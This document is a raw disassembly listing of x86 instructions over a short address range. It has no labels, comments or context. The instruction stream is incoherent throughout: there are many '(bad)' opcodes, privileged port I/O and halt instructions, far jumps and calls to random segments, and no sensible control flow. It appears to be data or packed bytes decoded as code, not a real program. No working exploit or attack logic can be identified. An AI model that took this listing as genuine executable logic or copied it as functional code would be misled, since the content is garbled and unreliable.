  422685:	dec    eax
  422686:	mov    ds:0xa1ee9b1a,al
  42268b:	xchg   al,dh
  42268d:	sbb    eax,0x1b981cc0
  422692:	stc    
  422693:	aas    
  422694:	cdq    
  422695:	dec    eax
  422696:	adc    BYTE PTR [esi],dl
  422698:	sub    cl,ch
  42269a:	rcl    BYTE PTR [edx+0x3417590f],cl
  4226a0:	sub    DWORD PTR [eax],0x7f
  4226a3:	ss nop
  4226a5:	retf   0xd4d
  4226a8:	pop    ebp
  4226a9:	jne    0x1b479bdf
  4226af:	add    edi,DWORD PTR [esi+0x14f62d9f]
  4226b5:	cmc    
  4226b6:	sub    ebx,edi
  4226b8:	sbb    ecx,DWORD PTR [esi]
  4226ba:	mov    esi,0x2df6550
  4226bf:	fisub  WORD PTR [ecx+eiz*2]
  4226c2:	dec    ecx
  4226c3:	and    eax,esi
  4226c5:	in     eax,dx
  4226c6:	jl     0x42273e
  4226c8:	ficomp WORD PTR [edi+edi*2-0x2d]
  4226cc:	add    BYTE PTR [edi-0x6423571],al
  4226d2:	adc    ebp,eax
  4226d4:	sbb    eax,0x7ed83b30
  4226d9:	cmp    dh,BYTE PTR [edi+0x657409c5]
  4226df:	sar    DWORD PTR [edi+0x77],0x50
  4226e3:	rol    bh,cl
  4226e5:	sub    ebp,ebp
  4226e7:	dec    esi
  4226e8:	inc    ebp
  4226e9:	hlt    
  4226ea:	jmp    esi
  4226ec:	jmp    0x6b8b316a
  4226f1:	bound  ebp,QWORD PTR [ecx-0x3f]
  4226f4:	(bad)  
  4226f5:	rcl    BYTE PTR [edi+ebx*8+0x11],1
  4226f9:	push   ds
  4226fa:	ins    DWORD PTR es:[edi],dx
  4226fb:	adc    DWORD PTR [edi],0xffffff99
  4226fe:	cmp    BYTE PTR [edx],al
  422700:	scas   eax,DWORD PTR es:[edi]
  422701:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422702:	mov    dl,0x6a
  422704:	(bad)  
  422706:	clc    
  422707:	lods   al,BYTE PTR ds:[esi]
  422708:	stos   BYTE PTR es:[edi],al
  422709:	out    dx,eax
  42270a:	mov    esp,0x3790d219
  42270f:	in     ax,0xa2
  422712:	push   ebp
  422713:	xchg   ecx,eax
  422714:	mov    dl,0x7a
  422716:	add    DWORD PTR [edx+ecx*4],0x7f8dee00
  42271d:	into   
  42271e:	push   ebp
  42271f:	fwait
  422720:	out    0x35,eax
  422722:	xlat   BYTE PTR ds:[ebx]
  422723:	outs   dx,DWORD PTR ds:[esi]
  422724:	xor    al,0x7a
  422726:	pop    esp
  422727:	jmp    0x4226fd
  422729:	push   ss
  42272a:	sbb    eax,eax
  42272c:	cs arpl cx,cx
  42272f:	nop
  422730:	or     al,0xca
  422732:	xchg   eax,ecx
  422734:	or     edi,DWORD PTR [ebp+0x70cf7ef9]
  42273a:	repnz xchg ebp,eax
  42273c:	jnp    0x42273e
  42273e:	lock pop esp
  422740:	mov    ds:0x20761aaa,eax
  422745:	sbb    edx,DWORD PTR [ecx-0x9]
  422748:	(bad)  [ebp+0x33]
  42274b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42274c:	xor    BYTE PTR [eax],cl
  42274e:	sub    eax,0x5b11947e
  422753:	fnstsw WORD PTR [ebx-0x1b951af5]
  422759:	shl    cl,cl
  42275b:	xor    DWORD PTR ds:0x119f03d7,edx
  422761:	cmp    bl,cl
  422763:	sbb    BYTE PTR [eax],dh
  422765:	call   0x3028:0x4985185b
  42276c:	cmp    eax,0x2c9cde01
  422771:	cmp    DWORD PTR [eax+0x4b2a5e56],0x1b0c8206
  42277b:	cmc    
  42277c:	xor    eax,0xfd6205bb
  422781:	push   ds
  422782:	dec    esp
  422783:	xor    DWORD PTR [ecx-0x2efc8878],eax
  422789:	aam    0x4f
  42278b:	cmc    
  42278c:	repnz jecxz 0x42271c
  42278f:	dec    edx
  422790:	dec    esi
  422791:	push   ecx
  422792:	cmc    
  422793:	inc    esp
  422794:	fistp  WORD PTR [esi+0x2e31bdc9]
  42279a:	xor    BYTE PTR [eax-0x512a7c06],al
  4227a0:	inc    ecx
  4227a1:	and    esp,DWORD PTR [esi+0x308dfcb9]
  4227a7:	jle    0x422742
  4227a9:	xchg   edi,eax
  4227aa:	sub    al,0x71
  4227ac:	push   edi
  4227ad:	fsubr  DWORD PTR [edi-0x5ab7fcbf]
  4227b3:	call   0xe215:0xdb01cf44
  4227ba:	push   ebp
  4227bb:	mov    al,ds:0x2304641a
  4227c0:	push   ds
  4227c1:	mov    ebx,0xb80e5e87
  4227c6:	and    al,BYTE PTR [esi+0x41]
  4227c9:	add    bh,al
  4227cb:	in     al,0x51
  4227cd:	xchg   DWORD PTR [ebx],ebx
  4227cf:	inc    ebx
  4227d0:	jmp    0x26526e37
  4227d5:	popf   
  4227d6:	jne    0x422836
  4227d8:	pop    ebx
  4227d9:	out    dx,eax
  4227da:	ss int3 
  4227dc:	cmp    DWORD PTR [ecx+0xa5bd9e],0x18a5c5e4
  4227e6:	jmp    0x4227b1
  4227e8:	lea    esi,[ebp-0x619a713f]
  4227ee:	loopne 0x4227e8
  4227f0:	push   ebx
  4227f1:	sbb    al,BYTE PTR [edx]
  4227f3:	cmc    
  4227f4:	aad    0xb
  4227f6:	shl    BYTE PTR [ebp+0x38ba1114],0xa7
  4227fd:	int    0xce
  4227ff:	pop    esp
  422800:	retf   0x7bb3
  422803:	xor    ecx,0x50
  422806:	sbb    cl,ch
  422808:	sub    eax,0x4dbcb354
  42280d:	adc    esi,eax
  42280f:	mov    DWORD PTR [ebp+0x2ff67f7f],0x5cf18263
  422819:	jl     0x4227a3
  42281b:	gs scas eax,DWORD PTR es:[edi]
  42281d:	jmp    0x6b91:0xaad38979
  422824:	dec    esi
  422825:	sub    al,0x91
  422827:	(bad)  
  422828:	rcr    ch,1
  42282a:	mov    DWORD PTR [edx+0xb820456],ecx
  422830:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422831:	gs ins DWORD PTR es:[edi],dx
  422833:	mov    dh,0xf6
  422835:	repnz inc ebp
  422837:	push   esp
  422838:	leave  
  422839:	vrcpss xmm7,xmm4,DWORD PTR [edx+esi*1-0x66]
  42283f:	aas    
  422840:	inc    eax
  422841:	sub    ah,BYTE PTR [esi+0x7]
  422844:	out    0xbf,al
  422846:	outs   dx,BYTE PTR ds:[esi]
  422847:	xor    BYTE PTR [edi+0x5846f949],al
  42284d:	pop    ebx
  42284e:	push   edx
  42284f:	repnz (bad) 
  422851:	cmp    eax,0x905ab6ed
  422856:	mov    ds:0xf960973b,eax
  42285b:	push   edx
  42285c:	cli    
  42285d:	je     0x42287a
  42285f:	ins    DWORD PTR es:[edi],dx
  422860:	ss call 0xb40520fe
  422866:	cmp    eax,0x94b9e0c0
  42286b:	push   0xffffffb8
  42286d:	cmp    eax,DWORD PTR fs:[edi-0x5b]
  422871:	lods   al,BYTE PTR ds:[esi]
  422872:	stos   DWORD PTR es:[edi],eax
  422873:	sbb    eax,0x1fc1e580
  422878:	pop    ebx
  422879:	je     0x42281e
  42287b:	hlt    
  42287c:	dec    edx
  42287d:	or     cl,BYTE PTR [ebx+esi*8-0x6e58835d]
  422884:	sub    ebp,DWORD PTR [eax+0x71b19149]
  42288a:	mov    eax,0xf707ce90
  42288f:	inc    edx
  422890:	and    dh,BYTE PTR [ebp+eiz*1-0x4de8a4b7]
  422897:	scas   al,BYTE PTR es:[edi]
  422898:	mov    DWORD PTR [esp+eax*8-0x23b1d346],ebx
  42289f:	xchg   esi,eax
  4228a0:	add    ebx,DWORD PTR [esp+esi*2-0x55e26916]
  4228a7:	sahf   
  4228a8:	adc    ecx,DWORD PTR [eax]
  4228aa:	mov    ch,0x59
  4228ac:	cmp    al,0xde
  4228ae:	aad    0x41
  4228b0:	mov    edi,0x40db781a
  4228b5:	inc    ecx
  4228b6:	adc    eax,0xc0e62a2c
  4228bb:	popf   
  4228bc:	call   0x43cc:0x4d007b92
  4228c3:	je     0x42287a
  4228c5:	push   eax
  4228c6:	fwait
  4228c7:	cli    
  4228c8:	push   ecx
  4228c9:	fisubr WORD PTR [esi]
  4228cb:	or     BYTE PTR [edx],bl
  4228cd:	jae    0x422917
  4228cf:	and    ebx,DWORD PTR [ecx-0x38e103e5]
  4228d5:	(bad)  
  4228d6:	(bad)  
  4228d7:	mov    cl,0x53
  4228d9:	ss inc eax
  4228db:	popa   
  4228dc:	add    al,0xda
  4228de:	mov    ch,0x68
  4228e0:	add    DWORD PTR [esi],ebp
  4228e2:	pop    esi
  4228e3:	dec    edx
  4228e4:	in     eax,0x11
  4228e6:	mov    al,0x2e
  4228e8:	aas    
  4228e9:	aam    0xa4
  4228eb:	inc    esi
  4228ec:	jae    0x4228db
  4228ee:	xchg   ebx,eax
  4228ef:	pop    edx
  4228f0:	sbb    al,bl
  4228f2:	scas   eax,DWORD PTR es:[edi]
  4228f3:	mov    ebx,DWORD PTR [ecx+0x59691ae2]
  4228f9:	cwde   
  4228fa:	loop   0x4228a5
  4228fc:	cld    
  4228fd:	(bad)  
  4228ff:	cmp    al,0x8c
  422901:	inc    eax
  422902:	xchg   DWORD PTR [ebp+0x3e],edi
  422905:	lea    eax,[edx+0x13c1ab26]
  42290b:	(bad)  
  42290c:	xlat   BYTE PTR ds:[ebx]
  42290d:	sub    bh,bh
  42290f:	mov    BYTE PTR [esi],dl
  422911:	cs jp  0x422911
  422914:	xchg   edi,eax
  422915:	rcl    esp,cl
  422917:	sbb    al,0x3
  422919:	sahf   
  42291a:	lea    edx,[eax+0x48]
  42291d:	iret   
  42291e:	cmp    eax,0x366d6669
  422923:	mov    esi,0xb50c7db0
  422928:	cmp    DWORD PTR [edx-0x43],edi
  42292b:	shl    BYTE PTR [ebp+0x77b46a11],0x6e
  422932:	call   0x66ca34fb
  422937:	mov    ebx,0xf3900155
  42293c:	push   ebp
  42293d:	(bad)  
  42293e:	repnz xchg ebp,eax
  422940:	pop    ebp
  422941:	gs dec eax
  422943:	xlat   BYTE PTR ds:[ebx]
  422944:	and    bh,bl
  422946:	je     0x4228cb
  422948:	add    BYTE PTR [eax],al
  42294a:	dec    eax
  42294b:	push   eax
  42294c:	push   eax
  42294d:	dec    ebp
  42294e:	pop    eax
  42294f:	dec    ebp
  422950:	pop    ebp
  422951:	push   ebp
  422952:	stos   DWORD PTR es:[edi],eax
  422953:	mov    ch,0xf6
  422955:	stc    
  422956:	pop    edx
  422957:	popa   
  422958:	fnstsw WORD PTR [edi+0x6]
  42295b:	mov    eax,0x6860001
  422960:	add    BYTE PTR [eax],al
  422962:	xlat   BYTE PTR ds:[ebx]
  422963:	push   esp
  422964:	pushf  
  422965:	sahf   
  422966:	lock ret 0xa0c9
  42296a:	int3   
  42296b:	mov    ds:0xa4f1c5cb,eax
  422970:	jmp    FWORD PTR [eax+0x39daf24d]
  422976:	xor    ch,BYTE PTR [ebp-0x32]
  422979:	adc    al,BYTE PTR [ebx+0x35]
  42297c:	or     al,BYTE PTR [eax-0x4ae7598f]
  422982:	pusha  
  422983:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422984:	dec    ecx
  422985:	jp     0x422951
  422987:	retf   0xee8f
  42298a:	cld    
  42298b:	sub    eax,0x4493f891
  422990:	sub    ah,BYTE PTR [ebx-0x74]
  422993:	adc    ah,bl
  422995:	loopne 0x422984
  422997:	jae    0x422944
  422999:	xchg   ebx,eax
  42299a:	das    
  42299b:	div    BYTE PTR [edi]
  42299d:	stc    
  42299e:	push   esi
  42299f:	bound  edi,QWORD PTR [edx+0x6b]
  4229a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4229a3:	or     eax,0x93ea78c0
  4229a8:	jmp    0x69908273
  4229ad:	dec    eax
  4229ae:	cmp    BYTE PTR [eax],0x1f
  4229b1:	mov    ds,WORD PTR [ebp+0x3f]
  4229b4:	add    WORD PTR [edx-0x77aa0bb],di
  4229bb:	cmp    eax,0x536df50a
  4229c0:	mov    DWORD PTR [edi-0x20e4898d],eax
  4229c6:	mov    ebx,DWORD PTR [edi+0x48]
  4229c9:	jmp    0x6d563316
  4229ce:	outs   dx,DWORD PTR ds:[esi]
  4229cf:	loop   0x4229f3
  4229d1:	cmp    ch,BYTE PTR [ecx+0xf488fff]
  4229d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4229d8:	mov    BYTE PTR [eax-0x65],dh
  4229db:	sbb    BYTE PTR [eax+0x20],al
  4229de:	pusha  
  4229df:	sbb    ebx,DWORD PTR [ecx]
  4229e1:	repnz and BYTE PTR [esi+0xe],bl
  4229e5:	scas   al,BYTE PTR es:[edi]
  4229e6:	icebp  
  4229e7:	jmp    0x84c6:0xb11c01a2
  4229ee:	adc    esp,edx
  4229f0:	inc    edi
  4229f1:	sbb    dh,ch
  4229f3:	out    dx,eax
  4229f4:	les    edx,FWORD PTR [ecx+0x57]
  4229f7:	rcr    DWORD PTR [edi],1
  4229f9:	push   eax
  4229fa:	and    esi,DWORD PTR [edx+0x7d]
  4229fd:	mov    bh,0x8
  4229ff:	call   0xcb459d6
  422a04:	aam    0xbe
  422a06:	fimul  DWORD PTR [esi+0x7be30766]
  422a0c:	mov    WORD PTR [eax],?
  422a0e:	(bad)  
  422a0f:	mov    al,ds:0x7342b8ea
  422a14:	sar    ch,cl
  422a16:	ja     0x42299f
  422a18:	dec    ebx
  422a19:	mov    bl,0xc5
  422a1b:	or     BYTE PTR [esi],ah
  422a1d:	pushf  
  422a1e:	cmp    DWORD PTR ds:0xaabf9092,eax
  422a24:	pop    ebp
  422a25:	push   0xfffffff0
  422a27:	sub    bh,bh
  422a29:	xor    esi,edi
  422a2b:	pushf  
  422a2c:	push   es
  422a2d:	mov    fs,WORD PTR [eax+0x3a]
  422a30:	adc    eax,DWORD PTR [esi]
  422a32:	call   0x89963c1a
  422a37:	jb     0x422a98
  422a39:	lock mov eax,DWORD PTR cs:0x4d9fbcba
  422a41:	loop   0x422a37
  422a43:	or     BYTE PTR [ebp+0x21],0xa3
  422a47:	or     eax,esi
  422a49:	xor    eax,0x4573a1a
  422a4e:	xchg   edx,eax
  422a4f:	imul   edx,DWORD PTR ds:0x80dd63a9,0x2c9e6445
  422a59:	in     eax,dx
  422a5a:	add    edi,DWORD PTR [eax+0x15]
  422a5d:	cmc    
  422a5e:	jno    0x422a3d
  422a60:	inc    ecx
  422a61:	xor    DWORD PTR [edi-0x6d],eax
  422a64:	pop    esi
  422a65:	mov    ah,0x71
  422a67:	add    al,0xdb
  422a69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422a6a:	test   BYTE PTR [eax],al
  422a6c:	cmp    edx,DWORD PTR [edx+0x5f29f32]
  422a72:	add    cl,0xb8
  422a75:	push   edi
  422a76:	stos   BYTE PTR es:[edi],al
  422a77:	adc    BYTE PTR [eax-0x4d818d77],0x84
  422a7e:	(bad)  
  422a7f:	lods   al,BYTE PTR ds:[esi]
  422a80:	push   es
  422a81:	idiv   BYTE PTR [edx+0x4f]
  422a84:	push   cs
  422a85:	sub    BYTE PTR [eax+ecx*4-0x39],0xc1
  422a8a:	je     0x422a96
  422a8c:	fwait
  422a8d:	or     al,BYTE PTR ds:0x1314c1e3
  422a93:	and    esi,DWORD PTR [esi+ecx*8-0xc38276d]
  422a9a:	cmp    al,0x9f
  422a9c:	inc    edx
  422a9d:	loope  0x422a6b
  422a9f:	add    bl,BYTE PTR [edx+0x55]
  422aa2:	mov    ecx,0xdab4792c
  422aa7:	inc    eax
  422aa8:	stc    
  422aa9:	xchg   edx,eax
  422aaa:	shl    DWORD PTR [edi-0x61],1
  422aad:	int3   
  422aae:	dec    edi
  422aaf:	test   BYTE PTR [ecx],ch
  422ab1:	ins    BYTE PTR es:[edi],dx
  422ab2:	mov    dh,0x26
  422ab4:	jecxz  0x422aa7
  422ab6:	xchg   esp,edx
  422ab8:	outs   dx,BYTE PTR ds:[esi]
  422ab9:	xlat   BYTE PTR ds:[ebx]
  422aba:	test   BYTE PTR [eax],ch
  422abc:	sti    
  422abd:	inc    ecx
  422abe:	jmp    0xe186bfaf
  422ac3:	neg    BYTE PTR [eax]
  422ac5:	and    eax,DWORD PTR [ecx]
  422ac7:	mov    dh,0x61
  422ac9:	and    al,0x47
  422acb:	aas    
  422acc:	cs inc edi
  422ace:	test   al,0x57
  422ad0:	and    al,0x7a
  422ad2:	push   ebp
  422ad3:	rcr    edi,cl
  422ad5:	mul    ebx
  422ad7:	mov    dh,0x7d
  422ad9:	mov    ch,0xb4
  422adb:	mov    bh,0x97
  422add:	jo     0x422aa4
  422adf:	jno    0x422b37
  422ae1:	jnp    0x422a85
  422ae3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422ae4:	retf   
  422ae5:	stos   BYTE PTR es:[edi],al
  422ae6:	push   ebp
  422ae7:	es mov dl,0x35
  422aea:	es xchg esp,eax
  422aec:	or     eax,0xb24572eb
  422af1:	xchg   ecx,eax
  422af2:	xchg   esi,eax
  422af3:	hlt    
  422af4:	and    al,0xae
  422af6:	inc    ebp
  422af7:	mov    dl,BYTE PTR [edx-0x64]
  422afa:	aaa    
  422afb:	sbb    BYTE PTR [esi+0x3aa18b09],dl
  422b01:	retf   0x941b
  422b04:	cld    
  422b05:	repz and BYTE PTR [edi-0x69],dl
  422b09:	rcr    DWORD PTR [edi+0x4c],0x5d
  422b0d:	mov    ah,0x21
  422b0f:	aad    0x55
  422b11:	and    edx,DWORD PTR [edi-0x28000f59]
  422b17:	ja     0x422ae2
  422b19:	int    0xa3
  422b1b:	adc    eax,0x8a402202
  422b20:	(bad)  
  422b21:	fdiv   DWORD PTR [edi]
  422b23:	xchg   BYTE PTR [ebx-0x2407aaaf],dh
  422b29:	stc    
  422b2a:	scas   al,BYTE PTR es:[edi]
  422b2b:	inc    ecx
  422b2c:	icebp  
  422b2d:	outs   dx,DWORD PTR ds:[esi]
  422b2e:	adc    edi,DWORD PTR [ebx]
  422b30:	lock inc edx
  422b32:	jae    0x422b56
  422b34:	je     0x422aeb
  422b36:	inc    edx
  422b37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422b38:	es nop
  422b3a:	inc    esp
  422b3b:	jecxz  0x422ad2
  422b3d:	mov    dl,0x2d
  422b3f:	pop    ss
  422b40:	xchg   ebx,eax
  422b41:	sub    bh,BYTE PTR [edx+0x3]
  422b44:	into   
  422b45:	xchg   BYTE PTR [edx-0x14],bl
  422b48:	fdiv   DWORD PTR [edx]
  422b4a:	(bad)  
  422b4b:	(bad)  
  422b4c:	pop    edi
  422b4d:	dec    ebp
  422b4e:	in     eax,dx
  422b4f:	jp     0x422bb5
  422b51:	cmp    BYTE PTR ds:0x55098c5d,dl
  422b57:	call   FWORD PTR [edi+eiz*1+0x61178b60]
  422b5e:	mov    al,ds:0x837910b8
  422b63:	dec    esp
  422b64:	nop
  422b65:	jnp    0x422b40
  422b67:	xchg   esp,eax
  422b68:	push   edi
  422b69:	mov    bl,0x47
  422b6b:	inc    esi
  422b6c:	pushf  
  422b6d:	repz dec esi
  422b6f:	jns    0x422bc6
  422b71:	into   
  422b72:	retf   0xb235
  422b75:	mov    edx,DWORD PTR [edx-0x56]
  422b78:	cmp    edi,DWORD PTR [edi]
  422b7a:	dec    esp
  422b7b:	inc    ebx
  422b7c:	add    bl,dl
  422b7e:	test   eax,0x69a58cbf
  422b83:	leave  
  422b84:	call   0xd20947ea
  422b89:	sub    dh,dl
  422b8b:	stos   DWORD PTR es:[edi],eax
  422b8c:	xor    al,0xcd
  422b8f:	inc    esi
  422b90:	arpl   WORD PTR [esi+0x5e90f92],ax
  422b96:	(bad)  
  422b97:	cmp    al,0x98
  422b99:	stos   DWORD PTR es:[edi],eax
  422b9a:	test   DWORD PTR ds:0xdba4c5b1,0x736b6f6a
  422ba4:	shr    BYTE PTR [eax+ebx*2+0x310ce597],1
  422bab:	pop    es
  422bac:	or     eax,0xb5fef23e
  422bb1:	neg    edi
  422bb3:	inc    sp
  422bb5:	sbb    DWORD PTR [ebp+0x2e7fa85f],ecx
  422bbb:	mov    DWORD PTR [ebp-0x58ddded8],ebp
  422bc1:	pushf  
  422bc2:	ja     0x422b71
  422bc4:	pop    esp
  422bc5:	lods   al,BYTE PTR ds:[esi]
  422bc6:	popa   
  422bc7:	les    ebp,FWORD PTR [ebx+0x17]
  422bca:	mov    esi,edx
  422bcc:	fcmovnbe st,st(4)
  422bce:	or     DWORD PTR [ebx],edx
  422bd0:	in     eax,0x16
  422bd2:	jmp    0xf9c35d74
  422bd7:	movzx  ecx,sp
  422bda:	pop    edx
  422bdb:	dec    esp
  422bdc:	mov    cl,0x2d
  422bde:	inc    edx
  422bdf:	pushf  
  422be0:	and    DWORD PTR [ebx-0x44],edx
  422be3:	xchg   BYTE PTR [edi],cl
  422be5:	pop    edx
  422be6:	sahf   
  422be7:	and    eax,0x15d34efe
  422bec:	and    ebx,esi
  422bee:	cli    
  422bef:	aam    0xbb
  422bf1:	push   0x329b017
  422bf6:	dec    ecx
  422bf7:	bound  edi,QWORD PTR [ebp+0xf39312f]
  422bfd:	mov    esp,0xe7d470bc
  422c02:	faddp  st(1),st
  422c04:	and    al,0x7e
  422c06:	lds    ebx,FWORD PTR ds:0x1b398c6c
  422c0c:	jb     0x422c3d
  422c0e:	adc    DWORD PTR [edi],ebx
  422c10:	(bad)  
  422c11:	fild   DWORD PTR [edx-0x74]
  422c14:	adc    BYTE PTR [eax-0x3a],al
  422c17:	out    dx,eax
  422c18:	jmp    0xadd4:0x688fe428
  422c1f:	std    
  422c20:	push   ebx
  422c21:	enter  0x9a3a,0xb7
  422c25:	pop    eax
  422c26:	std    
  422c27:	xor    dl,dl
  422c29:	ins    BYTE PTR es:[edi],dx
  422c2a:	stos   DWORD PTR es:[edi],eax
  422c2b:	pop    ebp
  422c2c:	outs   dx,BYTE PTR ds:[esi]
  422c2d:	pop    ss
  422c2e:	(bad)  
  422c2f:	repz xchg bl,ch
  422c32:	mov    al,BYTE PTR [edx+0x7841a7b3]
  422c38:	repnz push ebp
  422c3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c3b:	jmp    0x6658:0xee25bc01
  422c42:	mov    ch,0x4
  422c44:	mov    eax,DWORD PTR [ebx+ecx*1+0x3d]
  422c48:	and    esi,ebx
  422c4a:	(bad)  
  422c4b:	stos   BYTE PTR es:[edi],al
  422c4c:	dec    ebx
  422c4d:	shl    ebx,1
  422c4f:	sub    bl,ah
  422c51:	or     DWORD PTR [edi+edx*4-0xc],edi
  422c55:	ficom  WORD PTR [eax-0x16]
  422c58:	repz cmp bl,ah
  422c5b:	outs   dx,DWORD PTR ds:[esi]
  422c5c:	cmp    al,0x83
  422c5e:	pop    ebp
  422c5f:	pop    DWORD PTR [ebp-0x47]
  422c62:	add    BYTE PTR [edx-0x47f31478],dl
  422c68:	jp     0x422c3c
  422c6a:	iret   
  422c6b:	xor    BYTE PTR [edx-0x55],0xc3
  422c6f:	xchg   ebp,ebp
  422c71:	shr    BYTE PTR [ebp-0x65],0x16
  422c75:	sahf   
  422c76:	jns    0x422c65
  422c78:	mov    dh,0x27
  422c7a:	xor    esp,DWORD PTR [ecx+0x6db3629f]
  422c80:	lods   eax,DWORD PTR ds:[esi]
  422c81:	jne    0x422c28
  422c83:	sbb    al,0x6f
  422c85:	es je  0x422ccd
  422c88:	mov    cl,0x9d
  422c8a:	loopne 0x422c22
  422c8c:	mov    ebx,0x5191304
  422c91:	mov    esi,fs
  422c93:	jmp    0x422c4d
  422c95:	and    dh,cl
  422c97:	icebp  
  422c98:	jbe    0x422d03
  422c9a:	test   BYTE PTR [ebp+0x4af1bc68],bl
  422ca0:	sbb    eax,0xa6754834
  422ca5:	sub    esi,DWORD PTR [ebp-0x6665d31b]
  422cab:	mov    cl,0x58
  422cad:	xor    BYTE PTR [ecx-0x76],ch
  422cb0:	stos   BYTE PTR es:[edi],al
  422cb1:	test   ebp,ecx
  422cb3:	jo     0x422cb8
  422cb5:	add    ebx,DWORD PTR [edx+0x69]
  422cb8:	fwait
  422cb9:	jl     0x422ca2
  422cbb:	js     0x422c70
  422cbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422cbe:	xchg   edx,eax
  422cbf:	ficomp DWORD PTR [esi+0x120318b6]
  422cc5:	popa   
  422cc6:	fistp  DWORD PTR [ebx+ebx*2+0xebcf11a]
  422ccd:	pop    ds
  422cce:	ins    DWORD PTR es:[edi],dx
  422ccf:	cwde   
  422cd0:	mov    eax,0xb21940c5
  422cd5:	push   0xffffffc7
  422cd7:	push   0x28707801
  422cdc:	ret    0x501d
  422cdf:	push   eax
  422ce0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422ce1:	daa    
  422ce2:	push   ss
  422ce3:	pop    ecx
  422ce4:	sub    eax,0x8d7dbb50
  422ce9:	jo     0x422c83
  422ceb:	mov    al,0xe5
  422ced:	idiv   DWORD PTR [ebx-0x6c02b511]
  422cf3:	and    BYTE PTR [eax-0x62],al
  422cf6:	inc    esi
  422cf7:	jle    0x422cf4
  422cf9:	mov    esi,0x4de1c451
  422cfe:	add    DWORD PTR [eax+0x2b96b2b7],0x2685dcd2
  422d08:	mov    WORD PTR [ecx+0x3c],cs
  422d0b:	mov    edi,0x7d280a04
  422d10:	inc    esi
  422d11:	push   esi
  422d12:	or     DWORD PTR [ebp+0x23a066e6],esi
  422d18:	test   dh,cl
  422d1a:	push   ebx
  422d1b:	pop    ss
  422d1c:	dec    esi
  422d1d:	or     BYTE PTR [ecx],bh
  422d1f:	dec    ebx
  422d20:	sbb    eax,0xcdcf3189
  422d25:	sbb    al,0x7c
  422d27:	dec    ecx
  422d28:	adc    bl,BYTE PTR [edx]
  422d2a:	ror    BYTE PTR [edi+0x55],cl
  422d2d:	addr16 (bad) 
  422d2f:	bound  ebp,QWORD PTR [ebx-0x2c9a45c1]
  422d35:	xchg   edi,eax
  422d36:	jno    0x422d19
  422d38:	adc    BYTE PTR cs:[esi],cl
  422d3b:	test   eax,0xae73e84e
  422d40:	add    edi,DWORD PTR [ebp+0x59]
  422d43:	cmp    ah,BYTE PTR [ecx]
  422d45:	out    0x0,eax
  422d47:	mov    bl,0x44
  422d49:	jecxz  0x422d28
  422d4b:	adc    edi,DWORD PTR [eax+eax*8+0x5b]
  422d4f:	aad    0x23
  422d51:	ins    DWORD PTR es:[edi],dx
  422d52:	mov    ds:0xa86c4779,al
  422d57:	cli    
  422d58:	pop    es
  422d59:	aas    
  422d5a:	cmp    BYTE PTR [bp+di+0x272f],dh
  422d5f:	ja     0x422da4
  422d61:	iret   
  422d62:	pop    eax
  422d63:	xor    ecx,edx
  422d65:	ret    
  422d66:	push   eax
  422d67:	and    DWORD PTR [eax],ecx
  422d69:	imul   edx,DWORD PTR [ecx-0x3b],0x55
  422d6d:	jg     0x422de0
  422d6f:	mov    bl,0x0
  422d71:	mov    al,ds:0x9703b9a8
  422d76:	retf   
  422d77:	in     eax,0xe7
  422d79:	sub    BYTE PTR [esi-0x5b],0x73
  422d7d:	call   0xed15a166
  422d82:	shl    BYTE PTR [edi+0x4a],1
  422d85:	loopne 0x422d2f
  422d87:	bound  ebx,QWORD PTR [ebx+0xea55da2]
  422d8d:	jecxz  0x422d59
  422d8f:	int3   
  422d90:	(bad)  
  422d91:	repnz inc eax
  422d93:	xchg   DWORD PTR [eax-0x13e071c7],eax
  422d99:	and    ebp,esp
  422d9b:	stos   BYTE PTR es:[edi],al
  422d9c:	arpl   WORD PTR [eax+0x18],di
  422d9f:	ja     0x422db3
  422da1:	adc    DWORD PTR [edi+0x54],edi
  422da4:	push   ds
  422da5:	xor    al,0xa8
  422da7:	ins    DWORD PTR es:[edi],dx
  422da8:	outs   dx,BYTE PTR ds:[esi]
  422da9:	mov    BYTE PTR [ebp-0xef7f7b8],0xd4
  422db0:	and    ah,BYTE PTR [edi+eiz*1]
  422db3:	sub    dl,BYTE PTR [esi-0x61f13a7c]
  422db9:	pop    edi
  422dba:	or     ch,BYTE PTR [ecx]
  422dbc:	add    DWORD PTR [esi-0x7c671dfc],eax
  422dc2:	ja     0x422e38
  422dc4:	lds    ebp,FWORD PTR [ebx+eiz*1-0x7e]
  422dc8:	or     ebx,ecx
  422dca:	imul   ebp,eax,0x4104a2e6
  422dd0:	sti    
  422dd1:	pushf  
  422dd2:	push   esi
  422dd3:	adc    ah,cl
  422dd5:	adc    al,0x7c
  422dd7:	and    BYTE PTR [edi-0x69],dl
  422dda:	into   
  422ddb:	or     ebp,DWORD PTR ds:0x370f791a
  422de1:	fistp  QWORD PTR [ecx+0x16]
  422de4:	or     al,0x94
  422de6:	fimul  WORD PTR [ebp+0x2f]
  422de9:	or     DWORD PTR [esi-0x7b3fcc3d],ecx
  422def:	mov    ebx,DWORD PTR [edi]
  422df1:	and    ecx,DWORD PTR [ecx]
  422df3:	push   esp
  422df4:	mov    dh,0x4a
  422df6:	add    DWORD PTR [ebp+0x504bb2db],edx
  422dfc:	lea    eax,[ecx]
  422dfe:	push   ecx
  422dff:	lahf   
  422e00:	xor    al,0xf0
  422e02:	pop    ss
  422e03:	or     dh,BYTE PTR [ebx+0x7d76d20f]
  422e09:	in     al,0x4c
  422e0b:	and    al,0x8f
  422e0d:	rcl    DWORD PTR [ecx-0x5b],cl
  422e10:	mov    eax,0x29b89800
  422e15:	adc    esi,eax
  422e17:	sub    dl,BYTE PTR [eax-0xd56c48e]
  422e1d:	addr16 (bad) 
  422e1f:	pop    ds
  422e20:	mov    ebx,0x3787981a
  422e25:	cmp    BYTE PTR gs:[esi+0x59ffd5d8],0xe6
  422e2d:	jnp    0x422e9b
  422e2f:	retf   
  422e30:	fiadd  DWORD PTR [eax]
